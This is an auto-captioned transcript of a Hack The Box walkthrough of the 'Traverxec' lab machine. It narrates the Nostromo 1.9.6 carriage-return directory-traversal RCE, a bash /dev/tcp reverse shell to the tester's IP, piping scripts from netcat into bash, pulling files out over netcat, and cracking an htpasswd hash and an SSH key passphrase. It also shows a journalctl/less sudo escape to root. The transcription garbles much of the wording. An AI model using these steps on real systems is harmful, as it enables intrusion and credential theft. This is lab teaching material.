 what's going on YouTube there's a tip set me doing Travers act from hack the box which was a relatively easy Linux machine that starts off pretty uniquely it's running a web server but that web server is not Apache or nginx it's something called Knotts traumas and when you do search played against this promise you find out that there is a RCE and the way it handles urls and that is a Metasploit script I know a lot of people don't like using Metasploit but hey if there's someone out there that publishes work that lets you understand how an exploit works and you don't use it that's kind of silly so we're gonna throw a Metasploit at the box but before we do we're gonna pipe Metasploit through verb sweet so we can see exactly what the exploit is doing and to understand it craft it a little bit differently and get a shell on the box once on the box we'll dig through some config files find out there's a hidden SSH key get that SSH key switch to the David user and then from there abuse a weak sudo rule to get root and then once all that's done we're gonna dig into the source code of misnomers and try to understand exactly what happened so let's just jump in as always when you're start open it and lab so - SC for default scripts as via memory versions hue output all four events put in the end map director and call it Travers ech and then the IP address which is 10 10 10 165 and oh I don't have the directory and map created so we'll recreate that and then I also want to add a dash V flag to see open ports as it does find them while that runs we're going to do a second add map with - B - to do all ports that's one threes like 65535 I believe Oh a elkwood all formats and the a map directory Travers ACK - all ports and then the IP address which is 10 10 10 165 I hate having to and maps run simultaneously so I'll just give it five minutes by doing sleep 300 and then that will run which may have been a bit overzealous because the first add map did finish so let's take a look at the results and it looks like there's only two ports open the first one being ssh on port 22 and it's a debian box and we get the patch level there we also have HTTP on port 80 and it's running Nostromo version one point nine point six so it's not Apache or nginx so I'm just gonna do search play it against it and we get a directory traversal on 1.9.3 and a second directory traversal with Metasploit so let's just do search point - X and then let's look at the Metasploit one to see if it says what perversion is vulnerable is this the same exact thing and let's see this is saying one point nine point six so most likely this is going to be vulnerable to this Metasploit module that being said I don't want to exploit it just yet let's go take a look at what the page is itself because there may be a different way to do it it eggs throwing an exploit should never be the first thing you do doing some recon should always be before you exploit so going to the page we get hello my name is David white I create for the web and scrolling around check out my latest work and looking at these links portfolio 9 portfolio - so it looks like these are just going to pictures nowhere interesting live in San Francisco we got a contact form so we can see exactly how this works let's put a name as please subscribe and we'll put the email at root a tip SEC rocks subject please support me thank you for supporting and then I'm going to turn burp suite on just so we can intercept this request and turn it on there click send message send it to repeater no mail yet not yet finished please come back soon and again we still see this mr. mo thing and it's going to empty HTML so nothing too interesting I don't know why it said xml httprequest there but yeah nothing too interesting there let us just throw a go Buster at it then poke at Metasploit so I'm going to do go Buster directory mode - kill HTTP ten ten ten 165 - w-4 list I use a local dirt buster oh is it word list user share dirt Buster then word list directory list - 3 medium text and we do - out file just do root dot out or go Buster dot out and before I do this I just want to make sure this is only HTML burp dojo empty dot HTML we can look at the target site scope index is there Lib JavaScript I'm just looking at extensions so all I see is JavaScript so this could potentially be like a node application or just straight HTML so let's go look at Metasploit so doing whoa here messages looks like go Buster may don'ts this HT be 10 10 10 165 connection refused we did get some valid results at 301 but then it started reviewing refusing us so we could do - t1 for threads 1 the default thread is 10 and that's just how fast is gonna run so doing it at 1 is going to slow down go Buster dramatically but we're no longer getting these error messages so we're not crashing the server always be kind don't cause interruptions and service so the next thing we want to do is fine do what I've been saying and open up Metasploit and exploit this and I'm not just going to blindly around this exploit I want to take a look in see exactly what it does so once we get the exploit running we're gonna set our proxy to go through a burp suite so we can see what command it runs so I'm just gonna do search Travers Ecch Nostromo it's one of those days let's do use on this show options and then we get all the options so the proxies is how we're gonna separate suite so set proxies HTTP 1 27001 8080 then set our hosts to 10 10 10 165 our port at 80 that's fine server host this is gonna be probably used for where it serves a page so let's set this to 10 10 14 to which I believe is my IP address so we can then do set el host to 10 10 14 2 and set L port to 9001 that should be fine actually this serve port is going to have to change because this is going to that's burp suite right now so let's just change serve port to be 80 90 let's go over to burp suite go to a proxy turn intercept on run the exploit and we have to set reverse allow proxy true because we're doing a reverse shell and using a proxy so Metasploit thinks that it just can't reach back to us because normally when you use a proxy here's you and then you're normally proxying to a different host and then that's going to be the exploit a target so when you do a reverse shell it's saying you're using a proxy you probably can't route all the way back here in this case we can because the proxy is localhost the proxy is actually running here not on different host and additionally in some cases then you could do it anyways maybe you want the proxy to go out AWS and then call back to yourself which is running Callie and digitalocean or something say you want to do that and both you have routable IP addresses so you can do it that way it's really just a dummy check in case you're running Metasploit on a non-routable interface so we said Alan Traverse allowed proxy to true we run it again and we stir it in the handler on 9001 and hasn't done anything cancel well run show options proxies HTTP 127 0 180 type post port unset proxies run so we got further but we still don't have a shell but why did that proxy not work let's see set proxies to the same exact thing run that time it worked ok so the very first thing Metasploit is doing is doing a get on the page 10 10 10 165 and then that page returns probably the server header so Metasploit says oh this is Nostromo so then it runs the command so we're just going to send this to repeater and we're going to validate that what I said before is accurate so repeater MSF I was just curious what that first one was I forgot I did that and then we're gonna run this again so it timed out no session was created that's fine let's run drop the first one this one will going to turn intercept the response to this request and I'm going to put Apache and Ford and we see exploit of aborted due to failure Metasploit detecting as not vulnerable so if we set forth exploit to true then it would and you'd see that option in show Advanced Options and it shows a bunch of other things that is just hidden normally so if you look at advanced maybe it's was it force I think was force exploit force yeah for sex blade right here so if the exploits checking if it's vulnerable and you don't want to do that you just set force exploit to true and then when you run it again and then will intercept the response change this to Apache Metasploit will ignore that and run this anyways so right now it's doing a dot 0d this is I think a carriage return man is it X map man ASCII there we go so we want to look at what 0d is let's see 0d keratin backslash R so it's doing some reason dot backslash uh dot slash and then executing been SH and then echo echo Amana command if we listened on 9001 we'd get a shell back so let's do n CL v NP 9001 click send and we have a shell and that's just probably a pearl reverse shell yeah you could do anything you want so we could do the reverse shell we normally do bash - I dev TCP 1010 oh no - - I I can type dev TCP 10 1014 to slash 9001 0 @ + 1 so we could do a Rochelle like this so if we click send you don't get something back instead of doing bin Sh let's do BIM bash send and we get a reverse shell that is the same thing as doing like bash - see and then this and this will give us a shell as well the reason why we weren't getting a shell before is SH is sim linked probably - - which doesn't have that dev tcp thing so LS dash L a user been SH and yeah we see it is symlink - over - - and - does not have deb TCP that's a bash thing so let's upgrade or Rachelle Python - see em port PT y PT y dot spawn been - ok and then let's do ctrl Z s TTY raw - echo hit FG enter you don't see the prompt hit it twice and now you get it back and what that does is gives you tab autocomplete which is super handy so I'm also going to do export term is equal to X term so now I can clear this Green and let us begin we can close that Metasploit we're done with you so let's go take a look at the box the first thing I gently run is like pseudo - OH and we see it wants a password so let's do which curl do we have that we don't do we have and see we do so we can use NC so let's do make derp we'll call this recon I guess and then we'll copy up our CD opt privilege escalation awesome script sweet let's update it with git pull and then copy Len peas - htb boxes travers ech recon and let's just go into that directory and we'll say netcat LVN P 9001 and direct Lynn peas into it and now we just do netcat 10 10 14 - on 9001 and pipe that over to bash again if I can type so that's the same thing as curling a web server super easy to do and we'll let this one run and I always like running two different enumeration scripts so let's do CD opt linen oom do I have this in the repo it's already up to date so CP linen oom Sh and we'll copy it to the same place and NCL vnp 9001 let's just get a second show and run linen oom while we do this whenever I run linen oom though I like putting it in thorough mood so I'm going to edit this that says if Thoreau is equal to one so I'm going to do Thoreau is equal to one so we're just saying that at the very top of the script and Cl vnp 9001 and rerun this again so netcat ten ten fourteen to nine thousand one pipe it over to bash and oh shoot linen ooh there we go and I didn't do that TTY trick here so I can't use the up arrow to go back to it which is annoying but save time I'm not going to bother doing the tty trick in this window yet and thorough test is disabled so I did not set that correctly let's get a show back linen oom let's get rid of that dollar sign and I'm not going to be lazy now Python - see import PT y PT y lightspawn and Bosch sty raw - echo for ground it and now we can run that that cat command so NC and ten ten fourteen to nine thousand one pipe to Bosch and thorough tests are enabled so let's go take a look at Lynn peas real quick so NC ten I just did a reverse search and team ox so we can go to the command I typed so let's see what do we have the colonel compiled in November of two thousand nine teen which is probably around the time this box released so I'm going to ignore any type of colonel profess that may have came let's see nothing too interesting yet here's processes running on the box we can see a reverse shell but nothing too interesting binary process permissions again nothing too interesting cron jobs this looks all standard we could try doing like virtual host routing because it thinks it's travel exec and travels htb so we could see if we get a different page so let's just go to 10 10 10 165 and we should intercept this in burp suite intercept is on control shifter to force a refresh send mr. repeater clicks and I see it is 15 867 bytes so Traver Zek in the host same exact bytes htb same exact bytes so there's no virtual host routing on this IP addresses I see only e0 so probably not some type of container or dock or something like that IP tables it's interesting but we're all miss boxes were shells so I'm kind of getting to just ignore IP tables I was kind of curious why that was set but I don't know we do have the user David so I'm guessing that's where we want to go to get a user text last logins password policy searching for a bunch of things doesn't look like it has anything here are the set UID binaries nothing looks too interesting GID the grip 1 nope Linux capabilities everything looks standard they're still standard standard VMware tool stuff and I guess that's it so we didn't get anything ever limpy's so let's do Linda doom real quick and see if we have anything so let's see the kernel information Etsy passwd this is all stuff we've seen before system D timers I'm not sure that limpy's got this but they look standard I don't see any thing unique there that's just a different version of cron because system D decided it wanted to do everything so it's got its own cron running processes binaries bunch of information this is because we are in thorough mode that's giving all those files didn't look too interesting we found an HT passwd with a potential credential so let's go over and try to crack this now is invert and Astro mo Kampf HT passwd so SSH over to the Kraken which is just a box on my home network again I hate cracking and a VM and I also don't want to crack on my host machine when I'm recording because I may come to drop frames so we have this so V hashes and we'll call this HT access - maestro mo paste in the password run hash cat - - example hashes search for like HT pass DVD don't have it let's see that started with dollar one dollar that's probably md5 crypt so dollar one dollar md5 crypt let's make sure we have this third one so this is signifying the algorithm this is the salt and this is the password hash so let's make sure it follows that format we have that and then a salt and that so I'm confident this is md5 or md5 crypt which is moved 500 so dot flesch hash cat - M 500 then hashes and Nostromo and then opt word list rocky text let this run and I just want to make sure it starts and while it goes well you can go look through the other thing interesting files set UID files same exact things GID again the same and that is it so the only thing that this found was the HT passwd and we can go back and make sure this didn't see it so search for HT pass and readable history HT passwd so it looks like it's searched for it but for some reason did not find it so maybe it's just searching for it in a default location and Nostromo doesn't look like it's running out of that it was probably what was it Verna strong male it's probably running out of here so if we go to comp that's why HT past DVD was so is that protecting so let's turn boots weed off real quick just go to slash comp 404 not found I don't know what that file is doing there an HTP comp we can look at the configuration file for this email server root yeah that's weird that it's there I'd expected to be in htdocs' so maybe it's saved by mistake let's see if we have cracked it hey we'd have so the password is now only for me so let's just put the creds David now only for me and we found this in HD passwd so there is one other interesting thing is we have this home ders thing set and normally when you do home directories in websites they are signified by squiggly so squiggly root doesn't have it squiggly David does so private space nothing here keep out if we look at robots.txt nothing here look at the source nothing so normally goes to your home Drey so if we go to CD home David and question denied what was that filename called because the web server can read it we got a show as the web server so that is public dub dub dub Oh home David public dub dub dub and we have the files so what just happened was we don't have the execute bit set for this directory in order to list contents of a directory in a winning system you need execute and OH in order to enter a directory you need execute in order to read what's in it you just need read so since we have execute we can go into it but we don't have read so we can't list the contents but if we know a file that exists and we have read permission to it we can access it so we can also try like SSH permission denied so that's probably chmod adjust 600 we can't - bat history can we just read this we didn't get access to night but it's empty so always be careful about that bit we go back to public dub-dub-dub we do have protected file but I want to go and try this password so su - David try the password now only for me authentication failure we can try sudo - el this is a dub dub dub - data password maybe I've never really seen this user have a password because it normally doesn't have a shell so if we look at passwd graph dub dub dub - data it's on user s been no login so it having a password be really weird interesting it's home directory doesn't exist that's funny well but we do have this protected file area if we go here it looks like we have some files backup ssh identity files so let us run netcat so ncol vnp 9001 direct the content to backup tgz and then we can do netcat 1010 14 to nine thousand one and direct the backup file to us and it should be done probably I'm just going to do a D you backup and it looks like it's done the way I transferred it since this is listening and directing to a file and this is just sending it it's not going to auto terminate I bet if I let's try something else back up to if I did cat back up and then do NC 1010 fourteen to nine thousand one like this this may actually Auto close the net cat session because when this cat command finishes that's when this NC will finish nope do you back up to same exact thing so there's a way to get it to automatically close when it's done apparently I don't know it anymore but we have the backup so 2x j VF x direct backup t gz b zip 2x z VF there we go and we have home David SSH so if we can't ID RSA dub we see this key probably belongs to David at Trevor Zach and then we have this IDRs a file so we can cat it and we just see it is a encrypted or si key so let's go back over to the Kraken and try to crack this so SH Kraken up John and we'll call this one driver Zach dot Sh paste it and then we have SSH to John or find grep to John well there's a lot grap SH yeah SH when we'll try SSH ng to John try this so home directory we call this traffic Zach there we go so V travel exact John paste it John traffic Zak John and we want to do - - word list is equal to opt word list Brock you text I think it's just word list not word lists there we go and it instantly cracked it - hunter the reason why I use John is because I don't believe hash cat can actually crack as his H keys SSH ng let's do hash cat CD hash cat - - example hashes crap - is H let's see yeah I don't know if hash cat does SSH keys so that's why I use John if you know how to do it in hash cat let me know and I will probably switch over to hash cat until that I might use John so chmod 600 ID RSA to David at 10 10 10 165 yes pass trade was hunter and we get logged in so there are directories public dub-dub-dub and user text user dot text is readable by root and David so I was wondering like from a dub-dub-dub shell could we have read this but no we couldn't have you see bash history is directed to Davin all and anyone can read it so that's why that didn't give us a permission denied there is this bin directory so let's take a look at what's in bin and we have service that's dot head and service stats SH week at service that step head we just get this ok let's look at server stats sh cat open socket files Andrew last five Journal lines and it runs sudo so if we do sudo - L it wants a password was it now only for me cat creds copy this make sure I'm in the right clipboard paste okay so sudo wants a password but sudo can be configured to do no passwd per command so let us run this command so it run successfully so let's take a look at general CTL and gtfo bins general CTL sudo just by running it and then doing bang been SH because what in less which is essentially V so let's try doing it without the pipe so let's see Bend cat so sudo is weird in the sense that anything after like this is probably going to be executed as your user so let's do something real quick experiment time let's just exit the show because we don't need it so we'll do PS - EF correct for cat so for I n 0 sequence 0 100 do BS - EF grep for cat done okay so we're going to run this run this and we see the cat command was ran as David not the root user because again that's how that works if it wasn't like that at any time you had a sudo rule with the star you just do pipe and then cat been SH and would always execute as that user so sudo terminates at the pipe so let's just run this and now we're in a terminal actually I'm going to run it again with a blank screen so you can see it clearly so now we're just unless so it says do bang been SH and now we have escaped less and we are route so if we do psdf graft for Less psdf grep for general less should be running I'm not sure exactly what process spawned let's see root pseudo so let's grep for this to see if this is anyone's parent and then 7 + 3 9 s PSE F grep okay so I guess we can't see it but it's probably running less oh it's running pager and then pager is running bash but pager is just probably sim linked to less symlink to Etsy alternatives pager which is sim linked over to less so finally through digging in parent processes we have finally found it and the reason why that worked if you're curious or don't know when I did psdf grep for sudo I grabbed this PID this is process ID this is parent ID so when I did psdf grep for the process ID I can see this guy's parent process was pseudo so I just tracked it through that way of kept searching process and seeing who the child was so that is that so let's see one thing that I am curious about is the actual exploit itself because if we do search poit in a stromal we get a directory traversal and then a directory traversal here but this one was for 193 this one is for one nine six so let's take a look at exactly what this was so let's mirror it over to our directory and then take a look at it it is 3 5 4 6 6 and this this is ugly let's just try running it so bash 3 5 4 6 6 a bunch of commands not found source must roam I'll get rid of this how's it running so host one port to shift and then everything so this is just a bash script what this is doing is or one it's expecting host ugh - is the port and then the shift command means ok there's shift to more arguments get rid of the first two arguments and it does that so it can just do echo dollar at symbol and that does all arguments so if you want to see this real quick be test SH echo 1 echo to echo 3 I will do shift to echo 3 again so chmod plus x that's not Sh let's give it the shebang at the top please subscribe thanks oh we want to do that so please subscribe thanks and then get rid of the first two and does everything so thanks punch the at a is all arguments and the shift to got rid of these first two if we remove that shift to you can see the first two still exist so that's what that does so let's do this 10 10 10 165 or 80 on the command Who am I we get that carrot M let's just run dos to Unix oops there we go whenever I see a script fail and Linux because of that care come particular I always run Doster UNIX against it and it normally fixes it well we didn't get anything oh yeah this isn't gonna work because the exploit itself probably doesn't work on this version so let us send it to burp and oh I don't know how to send it to burp because of this netcat netcat is not proxy aware I don't think certainly not like I got - I proxy oh my god neck hat is Wow so - proxy - - proxy type really we can do this we'll call this please sub s H I did not expect this I'll do it two ways that's why I renamed the script - - proxy one 27001 8080 - - oh it was in my clipboard proxy type as HTTP I can't believe that cat maybe proxy aware and I did not know that clear everything let's run this again we just called it please sub it is and the script probably doesn't work that is ugly that is not a HTTP request in the least so the other way to do this if that cat wasn't proxy aware is just used proxy chains Etsy proxy chains let's take off socks for and we'll put an HTTP one and that's going to be on port 8080 and we could do proxy chains on the this one 10 10 10 165 82 ami that's how I normally do it intercept is off and we get the same result but man that is the most bare HTTP request I've ever seen so probably that said command is wrong maybe it was written on BSD and the flags were set or different because if you look at this it's doing this said quiet expression thing so this area is probably what screwed up or maybe the echo command is different I don't know but this post that it's saying is clearly not even there I don't know it is it's just after that dashi so it's also missing a HTTP version so if we just sent this even without those - ease let me get bad requests so let's do the version still bad request maybe it needs a host header bad request doesn't need a user agent let's see - f this is really just tax for slash so let's take the directory traversals out real quick maybe it just detects that directory traversal and that's what's doing it extend for for not found so yeah it doesn't like the directory traversal so what Metasploit did was they put a carriage return in the middle of dot dot slash and it no longer gives you that 400 Aaron just works let's test this out real quick Angad 110 1014 to TCP dump - I ton zero ICMP send let's try - see one I always get these flags mixed up yep there we go so yeah for some reason they care to turn fixes it so let's dig into why that is so in a stroma get up there does not look like it let's do a stroll mo HTTP server and httpd this looks like it development mr. omo 1 9 7 latest version so make der SRC w get let's see if we can get the 1 9 6 source as well we can so let's extract it so 2x j PF actually it's a x zv f 1 9 6 and 1 9 7 so now we have both i'm extracted so because we're just dealing with these source files we probably don't have like get to just look at what changed so let's do find dot - type F - exec md5sum so we're just going to md5 sum every single file so we can do auch friend - 1 to get every md5 type it over to sort and unique - see it this file exists 10 times what are you that's weird crap Oh CVS so it some versioning system but let's just grep for one and here are all the hashes of unique files so we can do awk print - two hashes and now go back to our original find command do grep - f4 file specify hashes and now we have a list every file that has changed between 196 and 1 1901 97 because it looks like he included the CVS so let's just look at this oh there's a change look this may tell us exactly what we want so let's see CBE 2019 16 278 due to missing accounting of the return character in Lib Lib my 1 7 str cut l function attack again by press the directory traversal check in HTTP verify function and a non CA treated server and thus remote code execution so let's see we want to look at s 2 your cut how it handles this and this is OK this CVE missing head account and HP had a compare function allowed in tacky to transmit more heavy than accepted resulting in I did not serve this ok so let's see the other one was 1 9 3 or let's see 1 9 for copyright Nostromo fixed a bug doesn't return CH that's a file behind each of Doc's don't know what bug that was I was looking for the directory traversal the initial one but I guess it doesn't matter so we know this is what we want HDB verify as to your cut return operator so let's take a look at this file stic then dude if on one nine six and one nine seven I'm going to do a - why - do side-by-side and any line that begins with like this in the middle is changed so can we pipe this to them nope let's just do less let's see this has changed that's not interesting I guess just changing how the loop works this means new line so carrot this way means a file was new a carrot the other way means a line was removed and this is changed so it looks like they're just kind of changing up how they do a loop here do we get the requested line nothing too interesting yet read the line okay I see what's going on so this is this left side is the old the right side is the new and we can see right here it's reading a line give mine this function is called STR cut so it's reading a line and processing character by character and this one is if the character is returned and it looks like maybe it says do nothing and then this one is going to stop processing so my assumption what this function does is whenever it gets to the return it just deletes that bit because it's ignoring it and then transmits this URL back to this which leads to the directory traversal so if we do a grep I think - lowercase F for dot dot - our note has it upper there we go let's see looking at slash and HTTP see a slash there we go so this is probably in that HTTP verify here we have it looking for the header if it's slash slash then it's going to return 400 so when the URL gets here the URL still is that dot return dot so it passes this check and then down the line somewhere it's going to call STR cut so let's see probably here call zestier cut L and then that's where the returns get removed and you have code execution so what is doing is calling Ben Sh which is an executable and then giving it these flags so I'm guessing that's kind of how the exploit worked and how the patch worked and looking through the changelog let's see we do have a dot dot slash in it so looking at that that was in version 1.87 that they had fixed a code execution vulnerability by putting dot dot slash in the URL and it was just a incomplete fix I guess because there was a way to bypass the blacklist that was implemented in this by putting a care to turn and all the dots so you could put that care to turn anywhere so was what percent 0d so if we do it after the second dot it still works as this where my TCP dump was you can see it doesn't have to be dot percent d dot all right yeah don't care to turn dot it can be cured to turn anywhere because you just can't have a single slash dot dot slash in the URL so hope that makes sense on the patch and the vulnerability or whatnot take care everyone and I'll see you all in next week